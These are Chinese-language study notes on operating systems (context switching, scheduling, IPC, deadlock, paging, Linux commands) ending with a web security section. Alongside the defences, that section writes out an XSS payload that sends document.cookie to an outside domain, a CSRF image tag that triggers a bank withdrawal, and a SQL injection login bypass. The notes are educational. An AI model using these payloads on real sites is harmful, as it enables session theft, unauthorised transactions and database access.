# 操作系统与安全

# 用户态内核态

　　**用户态切换到内核态的3种方式**

　　a. 系统调用

　　b. 异常（这个异常不是java当中的异常）

　　c. 外围设备的中断

**CPU 上下文切换的类型**

　　根据任务的不同，和java并发编程相关的我们只关心以下两种类型 - 进程上下文切换 - 线程上下文切换。

　　**进程上下文切换**

　　1、进程上下文切换之系统调用

　　　　进程既可以在用户空间运行，又可以在内核空间中运行。进程在用户空间运行时，被称为进程的用户态，而陷入内核空间的时候，被称为进程的内核态。

　　　　从用户态到内核态的转变，需要通过系统调用来完成。比如，当我们查看文件内容时，就需要多次系统调用来完成：首先调用 open() 打开文件，然后调用 read() 读取文件内容，并调用 write() 将内容写到标准输出，最后再调用 close() 关闭文件。

　　　　在这个过程中就发生了 CPU 上下文切换，整个过程是这样的：

　　　　　　1）保存 CPU 寄存器里原来用户态的指令位

　　　　　　2）为了执行内核态代码，CPU 寄存器需要更新为内核态指令的新位置。

　　　　　　3）跳转到内核态运行内核任务。

　　　　　　4）当系统调用结束后，CPU 寄存器需要恢复原来保存的用户态，然后再切换到用户空间，继续运行进程。

　　　　所以，一次系统调用的过程，其实是发生了两次 CPU 上下文切换

　　　　不过，需要注意的是，系统调用过程中，并不会涉及到虚拟内存等进程用户态的资源，也不会切换进程。这跟我们通常所说的进程上下文切换是不一样的：进程上下文切换，是指从一个进程切换到另一个进程运行；而系统调用过程中一直是同一个进程在运行。

　　　　所以，系统调用过程通常称为特权模式切换，而不是上下文切换。系统调用属于同进程内的 CPU 上下文切换。

 

　　2、真正的进程上下文切换和系统调用有什么区别呢？

　　　　进程的上下文不仅包括了虚拟内存、栈、全局变量等用户空间的资源，还包括了内核堆栈、寄存器等内核空间的状态。

　　　　因此，进程的上下文切换就比系统调用时多了一步：在保存内核态资源（当前进程的内核状态和 CPU寄存器）之前，需要先把该进程的用户态资源（虚拟内存、栈等）保存下来；而加载了下一进程的内核态后，还需要刷新进程的虚拟内存和用户栈。

　　

　　　　发生进程上下文切换的场景：

　　　　　　1）为了保证所有进程可以得到公平调度，CPU 时间被划分为一段段的时间片，这些时间片再被轮流分配给各个进程。这样，当某个进程的时间片耗尽了，就会被系统挂起，切换到其它正在等待CPU 的进程运行。

　　　　　　2）进程在系统资源不足（比如内存不足）时，要等到资源满足后才可以运行，这个时候进程也会被挂起，并由系统调度其他进程运行。

　　　　　　3）当进程通过睡眠函数 sleep 这样的方法将自己主动挂起时，自然也会重新调度。

　　　　　　4）当有优先级更高的进程运行时，为了保证高优先级进程的运行，当前进程会被挂起，由高优先级进程来运行。

**线程上下文切换**

　　特点以及场景：

　　　　1. 前后两个线程属于不同进程。此时，因为资源不共享，所以切换过程就跟进程上下文切换是一样。

　　　　2. 前后两个线程属于同一个进程。此时，因为虚拟内存是共享的，所以在切换时，虚拟内存这些资源就保持不动，只需要切换线程的私有数据、寄存器等不共享的数据和一个同学的套路（cas不会升级内核态，他仅仅是处理器提供的一个指令，速度非常快）

# CPU缓存

cpu速度比内存快很多，为了提高速度，就在cpu中引入缓存，没有命中才去内存中找。L1缓存靠近cpu内核，速度最快，l2缓存速度慢于l1.

**多核CPU多级缓存一致性协议MESI**

多核CPU的情况下有多个一级缓存，如何保证缓存内部数据的一致,不让系统数据混乱。这里就引出了一个一致性的协议MESI。

**栈缓冲区溢出：** 

**前提：**

一般发生在C这种需手工管理内存的语言编写的程序中

**原理：**

进程分控制层面和数据层面两个部分，每个部分各占一部分内存。

当程序没有对数据层面内存大小做限制时，输入一个超过数据内存大小的数据就会发生数据层面的数据把控制层面内存覆盖的情况，此时如果在数据尾部加上一些操作系统指令就会把该指令加载到控制层面

内存（即寄存器）当中去，当CPU执行下一个控制层面内存里的内容时就会加载该恶意指令。  (注：寄存器中的EIP为CPU要执行的下一条指令的内存地址)

# 进程与线程 协程

## 区别

Ⅰ 拥有资源

进程是资源分配的基本单位，而线程不拥有资源，同一个进程内的线程共享地址空间和代码块，线程的私有数据、寄存器等不共享的数据

Ⅱ 调度

线程是独立调度的基本单位，在同一进程中，线程的切换不会引起进程切换，从一个进程中的线程切换到另一个进程中的线程时，会引起进程切换。

Ⅲ 系统开销

进程创建删除的开销较大，系统都要为之分配或回收资源，如内存空间、I/O 设备等，

进程切换时，涉及当前执行进程 CPU 环境的保存及新调度进程 CPU 环境的设置，线程切换时只需保存和设置少量寄存器内容，开销很小。

Ⅳ 通信方面

线程间可以通过直接读写同一进程中的数据进行通信，但是进程通信需要借助 IPC。

**协程**

- 一个线程可以包含多个协程。协程是串行执行的，只能在一个线程内运行，切换由用户决定，切换不需要进入内核态，效率高。

# 进程调度

# 进程调度算法

不同环境的调度算法目标不同，因此需要针对不同环境来讨论调度算法。

**1. 批处理系统**

批处理系统没有太多的用户操作，在该系统中，调度算法目标是保证吞吐量和周转时间（从提交到终止的时间）。

**1.1 先来先服务 first-come first-serverd（FCFS）**

非抢占式的调度算法，按照请求的顺序进行调度。

有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长。

**1.2 短作业优先 shortest job first（SJF）**

非抢占式的调度算法，按估计运行时间最短的顺序进行调度。

长作业有可能会饿死，处于一直等待短作业执行完毕的状态。因为如果一直有短作业到来，那么长作业永远得不到调度。

**1.3 最短剩余时间优先 shortest remaining time next（SRTN）**

最短作业优先的抢占式版本，按剩余运行时间的顺序进行调度。 当一个新的作业到达时，其整个运行时间与当前进程的剩余时间作比较。如果新的进程需要的时间更少，则挂起当前进程，运行新的进程。否则新的进程等待。

**2. 交互式系统**

交互式系统有大量的用户交互操作，在该系统中调度算法的目标是快速地进行响应。

**2.1 时间片轮转**

将所有就绪进程按 FCFS 的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程可以执行一个时间片。当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首的进程。

时间片轮转算法的效率和时间片的大小有很大关系：

- 因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间。
- 而如果时间片过长，那么实时性就不能得到保证。

[![img](https://camo.githubusercontent.com/8ff909218be7e1269ee5912f0aba9fcb3552df3b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38633636323939392d633136632d343831632d396634302d3166646261356263393136372e706e67)](https://camo.githubusercontent.com/8ff909218be7e1269ee5912f0aba9fcb3552df3b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38633636323939392d633136632d343831632d396634302d3166646261356263393136372e706e67)



**2.2 优先级调度**

为每个进程分配一个优先级，按优先级进行调度。

为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级。

**2.3 多级反馈队列**

一个进程需要执行 100 个时间片，如果采用时间片轮转调度算法，那么需要交换 100 次。

多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。进程在第一个队列没执行完，就会被移到下一个队列。这种方式下，之前的进程只需要交换 7 次。

每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程。

可以将这种调度算法看成是时间片轮转调度算法和优先级调度算法的结合。

[![img](https://camo.githubusercontent.com/a69a61aafa8f82822c3679b989d58d1ce332f9ae/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30343263663932382d336338652d343831352d616539632d6632373830323032633638662e706e67)](https://camo.githubusercontent.com/a69a61aafa8f82822c3679b989d58d1ce332f9ae/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30343263663932382d336338652d343831352d616539632d6632373830323032633638662e706e67)



## 3. 实时系统

实时系统要求一个请求在一个确定时间内得到响应。

分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时。

# 进程同步

1. **临界区  对临界资源进行访问的那段代码称为临界区。**

**2. 同步与互斥**

- 同步：多个进程因为合作产生的直接制约关系，使得进程有一定的先后执行关系。
- 互斥：多个进程在同一时刻只有一个进程能进入临界区。

**3. 信号量**（Semaphore）是一个整型变量，可以对 P 和 V 操作。如果信号量的取值只能为 0 或者 1，那么就成为了 **互斥量（Mutex）** 

- **down** : 如果信号量大于 0 ，执行 -1 操作；如果信号量等于 0，进程睡眠，等待信号量大于 0；
- **up** ：对信号量执行 +1 操作，唤醒睡眠的进程让其完成 down 操作。

down 和 up 操作需要被设计成原语，不可分割，通常的做法是在执行这些操作的时候屏蔽中断。

**4. 管程**

管程把控制的代码独立出来，不仅不容易出错，也使得客户端代码调用更容易。

管程有一个重要特性：在一个时刻只能有一个进程使用管程。进程在无法继续执行的时候不能一直占用管程，否则其它进程永远不能使用管程。

管程引入了 **条件变量** 以及相关的操作：**wait()** 和 **signal()** 来实现同步操作。对条件变量执行 wait() 操作会导致调用进程阻塞，把管程让出来给另一个进程持有。signal() 操作用于唤醒被阻塞的进程。

# 进程通信

进程同步与进程通信很容易混淆，它们的区别在于：

- 进程同步：控制多个进程按一定顺序执行；
- 进程通信：进程间传输信息。

进程通信是一种手段，而进程同步是一种目的。也可以说，为了能够达到进程同步的目的，需要让进程进行通信，传输一些进程同步所需要的信息。

1. **无名管道**

 调用pipe函数时在内核中开辟一块缓冲区(称为管道)用于通信， fd[0] 用于读，fd[1] 用于写。

shell中执行命令，经常会将上一个命令的输出作为下一个命令的输入，由多个命令配合完成一件事情。而这就是通过管道来实现的。 

它具有以下限制：

- 只支持半双工通信（单向交替传输）；
- 只能在父子进程或者兄弟进程中使用。

**2.命名管道**

去除了管道只能在父子进程中使用的限制。

3. **消息队列**

相比于 FIFO，消息队列具有以下优点：

- 消息队列可以独立于读写进程存在，从而避免了 FIFO 中同步管道的打开和关闭时可能产生的困难；
- 避免了 FIFO 的同步阻塞问题，不需要进程自己提供同步方法；
- 读进程可以根据消息类型有选择地接收消息，而不像 FIFO 那样只能默认地接收。

**4. 信号量**

它是一个计数器，用于为多个进程提供对共享数据对象的访问。

5. **共享内存**

允许多个进程共享一个给定的存储区。多个进程将同一文件映射到自身的地址空间中。一个进程向共享内存写入数据，将立即影响到可以访问同一段共享内存的任何其他进程。因为数据不需要在进程之间复制，所以这是最快的一种 IPC。它往往与其它通信机制（如**信号量**）配合使用，来实现进程间的同步和通信 

6. **套接字**

与其它通信机制不同的是，它可用于不同机器间的进程通信。

# 死锁

## 四个条件

- 互斥：每个资源要么已经分配给了一个进程，要么就是可用的。
- 占有和等待：已经得到了某个资源的进程可以再请求新的资源。
- 不可抢占：已经分配给一个进程的资源不能强制性地被抢占，它只能被占有它的进程显式地释放。
- 环路等待：有两个或者两个以上的进程组成一条环路，该环路中的每个进程都在等待下一个进程所占有的资源。

## 解决方法

- 鸵鸟策略  ：什么都不做
- 死锁检测与死锁恢复 ： 在死锁发生时进行恢复。死锁检测是检测资源分配图的向量图是否有环。死锁恢复通过抢占资源，回滚，杀死进程恢复。
- 死锁预防：在程序运行前避免死锁，通过破坏死锁四个条件来完成
- 死锁避免：运行时避免死锁，通过银行家算法完成。

# 内存管理

## 内存分配算法

在内存中设置一张空闲分区表，用于记录空闲分区的情况。每个空闲分区占一个表目，每格中包括分区号，分区大小，分区初始地址等数据。



 ![img](https://img-blog.csdnimg.cn/20190514181700962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkyODU0NA==,size_16,color_FFFFFF,t_70) 

- 首次适应算法（FirstFit）：空闲区按地址从低到高排序。从空闲分区表的第一个表目开始查找，将第一个满足要求的空闲区进行分配。优点是减少查找时间。缺点是优先使用低地址空间，在低址空间造成许多小的空闲区，在高地址空间保留大的空闲区。
- 最佳适应算法（BestFit)：空闲区按从小到大排列。从全部空闲区中找出能满足作业要求的、且大小最小的空闲分区，这种方法能使碎片尽量小。为适应此算法，空闲分区表（空闲区链）中的空闲分区要按从小到大进行排序，自表头开始查找到第一个满足要求的自由分区分配。该算法保留大的空闲区，但造成许多小的空闲区。
- 最差适应算法（WorstFit)：从全部空闲区中找出能满足作业要求的、且大小最大的空闲分区，从而使链表中的结点大小趋于均匀，适用于请求分配的内存大小范围较窄的系统。为适应此算法，空闲分区表（空闲区链）中的空闲分区按大小从大到小进行排序，自表头开始查找到第一个满足要求的自由分区分配。该算法保留小的空闲区，尽量减少小的碎片产生。

## **虚拟内存**

虚拟内存的目的是为了让物理内存扩充成更大的逻辑内存。

操作系统将内存抽象成地址空间。程序拥有自己的地址空间，以页为单位，映射到物理内存。不用将程序地址空间中的每一页都映射到物理内存。

 实现分页的基本方法涉及将**物理内存分为固定大小的块**，成为**帧**；而将逻辑内存也分为同样大小的块，称为**页**。当需要执行进程时，该进程的页会被调入到可用的内存帧中。 

### **页面置换算法**

缺页中断： 使用虚拟内存，页面不必常驻内存，在执行一条指令时，如果发现他要访问的页没有在内存中（即存在位为0），那么停止该指令的执行，并产生一个页不存在的异常，此时从外存用页面置换算法加载该页的方法来排除故障，之后，原先引起的异常的指令就可以继续执行，而不再产生异常。 

1. 最佳（OPT）

所选择的被换出的页面将是最长时间内不再被访问，通常可以保证获得最低的缺页率。

是一种理论上的算法，因为无法知道一个页面多长时间不再被访问。

2. 最近最久未使用 LRU 将最近最久未使用的页面换出。

3. 最近未使用

> NRU, Not Recently Used

每个页面都有两个状态位：R 与 M，读页面设置 R=1，写页面设置 M=1。可以将页面分成以下四类：

- R=0，M=0
- R=0，M=1
- R=1，M=0
- R=1，M=1

当发生缺页中断时，随机挑选一个类编号最小的一个页面将它换出。

NRU 优先换出已经被修改的脏页面（R=0，M=1），而不是被频繁使用的干净页面（R=1，M=0）。

4. 先进先出

> FIFO, First In First Out

选择换出的页面是最先进入的页面。

该算法会将那些经常被访问的页面也被换出，从而使缺页率升高。

5. 第二次机会算法

FIFO 算法可能会把经常使用的页面置换出去，为了避免这一问题，对该算法做一个简单的修改：

当页面被访问 (读或写) 时设置该页面的 R 位为 1。需要替换的时候，检查最老页面的 R 位。如果 R 位是 0，那么这个页面既老又没有被使用，可以立刻置换掉；如果是 1，就将 R 位清 0，并把该页面放到链表的尾端，修改它的装入时间使它就像刚装入的一样，然后继续从链表的头部开始搜索。

6. 时钟

> Clock

第二次机会算法需要在链表中移动页面，降低了效率。时钟算法使用环形链表将页面连接起来，再使用一个指针指向最老的页面。

## 页式

 为了解决外部碎片问题，一种可行的方案是**允许物理地址空间为非连续的** 。

 实现分页的基本方法涉及将**物理内存分为固定大小的块**，成为**帧**；而将逻辑内存也分为同样大小的块，称为**页**。当需要执行进程时，该进程的页会被调入到可用的内存帧中。 

CPU生成的每个地址分为两个部分：页号（**p**）和页偏移（**d**）。**页号作为页表中的索引**。页表中包含**每页所在物理内存的基地址**，这些基地址与页偏移的组合就形成的物理地址，就可交送给物理单元。


## 段式

逻辑空间由段组成，每个段长度不同。通过段号+偏移量指定地址。

## 段页式

程序的地址空间划分成多个拥有独立地址空间的段，每个段上分成大小相同的页。这样既拥有分段系统的共享和保护，又拥有分页系统的虚拟内存功能。通过段号，页号，偏移量查内存地址。

**分页与分段的比较**

- 对程序员的透明性：分页透明，但是分段需要程序员显式划分每个段。
- 地址空间的维度：分页是一维地址空间，分段是二维的。
- 大小是否可以改变：页的大小不可变，段的大小可以动态改变。
- 出现的原因：分页主要用于实现虚拟内存，从而获得更大的地址空间；分段主要是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护。

# 磁盘

- 盘面（Platter）：一个磁盘有多个盘面；
- 磁道（Track）：盘面上的圆形带状区域，一个盘面可以有多个磁道；
- 扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是最小的物理储存单位，目前主要有 512 bytes 与 4 K 两种大小；
- 磁头（Head）：与盘面非常接近，能够将盘面上的磁场转换为电信号（读），或者将电信号转换为盘面的磁场（写）；
- 制动手臂（Actuator arm）：用于在磁道之间移动磁头；
- 主轴（Spindle）：使整个盘面转动。

[![img](https://camo.githubusercontent.com/42c8be3472d81b72762c2a88b29fa61b4bdf2409/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30313466626334642d643837332d346131322d623136302d3836376464616564393830372e6a7067)](https://camo.githubusercontent.com/42c8be3472d81b72762c2a88b29fa61b4bdf2409/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30313466626334642d643837332d346131322d623136302d3836376464616564393830372e6a7067)



## 磁盘调度算法

读写一个磁盘块的时间的影响因素有：

- 旋转时间（主轴转动盘面，使得磁头移动到适当的扇区上）
- 寻道时间（制动手臂移动，使得磁头移动到适当的磁道上）
- 实际的数据传输时间

其中，寻道时间最长，因此磁盘调度的主要目标是使磁盘的平均寻道时间最短。

# Linux

## 文件系统

最主要的几个组成部分如下：

- inode：一个文件占用一个 inode，记录文件的属性，同时记录此文件的内容所在的 block 编号；
- block：记录文件的内容，文件太大时，会占用多个 block。

除此之外还包括：

- superblock：记录文件系统的整体信息，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统的格式与相关信息等；
- block bitmap：记录 block 是否被使用的位图。

**两种系统**

Ext2 文件系统，先在 inode 中查找文件内容所在的所有 block，然后把所有 block 的内容读出来。

FAT 文件系统，它没有 inode，每个 block 中存储着下一个 block 的编号。

**磁盘碎片**

指一个文件内容所在的 block 过于分散，导致磁盘磁头移动距离过大，从而降低磁盘读写性能。

**数据修复**

如果突然断电，那么文件系统会发生错误，例如断电前只修改了 block bitmap，而还没有将数据真正写入 block 中。

ext3/ext4 文件系统引入了日志功能，可以利用日志来修复文件系统。

## 操作

**文件创建**  cd ls mkdir rmdir rm -rf cp scp

**权限类** chomd 777

**获取文件内容** cat less（一页页查看内容） more tail（显示末尾）head

**文件搜索** find . -name "*.log" | xargs grep ""

**管道** ： 命令的标准输出作为另一个命令的标准输入 

```
$ cut
-d ：分隔符
-f ：经过 -d 分隔后，使用 -f n 取出第 n 个区间
-c ：以字符为单位取出区间
```

**正则 **  grep  printf   awk

**进程管理** ps aux | grep     top      netstat -anp | grep

**vmstat** — 虚拟内存统计

vmstat 命令是用于显示虚拟内存、内核线程、磁盘、系统进程、I/O 模块、中断、CPU 活跃状态等更多信息。在默认的情况下，Linux 系统是没有 vmstat 这个命令的，如果你要使用它，必须安装一个包名叫 sysstat 的程序包。命令格式常用用法如下：

procs ———–memory———- —swap– —–io—- –system– —–cpu—– 
r b swpd free inact active si so bi bo in cs us sy id wa st 
1 0 0 810420 97380 70628 0 0 115 4 89 79 1 6 90 3 0 
**tcpdump** — 网络数据包分析器

tcpdump 是一种使用最广泛的命令行网络数据包分析器或数据包嗅探程序，主要用于捕获和过滤 TCP/IP 包收到或者转移在一个网络的特定借口信息。它也提供了一个选项参数去保存将捕获的包在一个文件中用于以后分析使用，tcpdump 几乎在所有的 Linux 版本中都是可用的。

tcpdump: verbose output suppressed, use -v or -vv for full protocol decode 
listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes 
22:08:59.617628 IP tecmint.com.ssh > 115.113.134.3.static-mumbai.vsnl.net.in.28472: P 2532133365:2532133481(116) ack 3561562349 win 9648 
22:09:07.653466 IP tecmint.com.ssh > 115.113.134.3.static-mumbai.vsnl.net.in.28472: P 116:232(116) ack 1 win 9648 
22:08:59.617916 IP 115.113.134.3.static-mumbai.vsnl.net.in.28472 > tecmint.com.ssh: . ack 116 win 64347 

## 软链接和硬链接

 软连接：目录项中的inode节点号指向的block存储的是另一个文件的路径名。 ls li查看

硬链接： 目录项中的inode节点号指向的block存储数据。

区别： 硬链接不可以跨分区，软连接可以跨分区
硬链接增加链接数，软连接不增加
inode节点编号 硬链接增加 软链接不增加 

## 孤儿进程和僵尸进程

**孤儿进程：**父进程退出，子进程还在运行，将成为孤儿进程。会被 init 进程（进程号为 1）所收养，并由 init 进程对它们完成状态收集工作，不会造成危害

由于孤儿进程会被 init 进程收养，所以孤儿进程不会对系统造成危害。

**僵尸进程**：子进程退出，父进程并没有调用 wait() 或 waitpid()，子进程的进程描述符仍然保存在系统中，这种进程称之为僵尸进程。如果产生大量僵尸进程，将因为没有可用的进程号而导致系统不能产生新的进程。

僵尸进程通过 ps 命令显示出来的状态为 Z（zombie）。

要消灭系统中大量的僵尸进程，只需要**将其父进程杀死**，此时僵尸进程就会变成孤儿进程，从而被 init 进程所收养，这样 init 进程就会释放所有的僵尸进程所占有的资源，从而结束僵尸进程。

# 系统安全

# 一、跨站脚本攻击

跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上。分为持久性攻击和非持久性攻击。

- **持久型也就是攻击的代码被服务端写入进数据库中**，这种攻击危害性很大，因为如果网站访问量很大的话，就会导致大量正常访问页面的用户都受到攻击。

> 举个例子，对于评论功能来说，就得防范持久型 `XSS` 攻击，因为我可以在评论中输入以下内容

![image.png](https://upload-images.jianshu.io/upload_images/1480597-4d0534470dcfe615.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

- 这种情况如果前后端没有做好防御的话，这段评论就会被存储到数据库中，这样每个打开该页面的用户都会被攻击到。
- **非持久型通过修改 `URL` 参数的方式加入攻击代码**，诱导用户访问链接从而进行攻击。

**攻击原理**

例如有一个论坛网站，攻击者可以在上面发布以下内容：

```
<script>location.href="//domain.com/?c=" + document.cookie</script>
```

之后该内容可能会被渲染成以下形式：

```
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。

**危害**

- 窃取用户的 Cookie
- 伪造虚假的输入表单骗取个人信息
- 显示伪造的文章或者图片

## 防范手段

**1. 设置 Cookie 为 HttpOnly**

设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。

**2. 过滤特殊字符**

例如将 `<` 转义为 `<`，将 `>` 转义为 `>`，从而避免 HTML 和 Jascript 代码的运行。

富文本编辑器允许用户输入 HTML 代码，就不能简单地将 `<` 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。

富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。

以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。

```
<h1 id="title">XSS Demo</h1>

<p>123</p>

<form>
  <input type="text" name="q" value="test">
</form>

<pre>hello</pre>

<script type="text/javascript">
alert(/xss/);
</script>
<h1>XSS Demo</h1>

<p>123</p>

&lt;form&gt;
  &lt;input type="text" name="q" value="test"&gt;
&lt;/form&gt;

<pre>hello</pre>

&lt;script type="text/javascript"&gt;
alert(/xss/);
&lt;/script&gt;
```

> [XSS 过滤在线测试](http://jsxss.com/zh/try.html)

# 二、跨站请求伪造

跨站请求伪造（Cross-site request forgery，CSRF）， 攻击者构造出一个后端请求地址，诱导用户点击或者通过某些途径自动发起请求。如果用户是在登录状态下的话，后端就以为是用户在操作，从而进行相应的逻辑。被访问的网站会认为是真正的用户操作而去执行。

XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。

**攻击原理**

假如一家银行用以执行转账操作的 URL 地址如下：

```
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
```

那么，一个恶意攻击者可以在另一个网站上放置如下代码：

```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
```

如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。

这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。

通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。

## 防范手段

**1. 检查 Referer 首部字段**

Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。

**2. 添加校验 Token**

在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。

**3. 输入验证码**

因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。

# 三、SQL 注入攻击

服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。

**攻击原理**

例如一个网站登录验证的 SQL 查询代码为：

```
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

如果填入以下内容：

```
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
```

那么 SQL 查询字符串为：

```
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

此时无需验证通过就能执行以下查询：

```
strSQL = "SELECT * FROM users;"
```

## 防范手段

**1. 使用参数化查询**

Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。

Mybatis使用#() 预编译 ，不用$() 防止sql注入

```
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
stmt.setString(1, userid);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

**2. 单引号转换**

将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。

# 四、拒绝服务攻击

拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。

tcp泛洪， udp泛洪， ping泛洪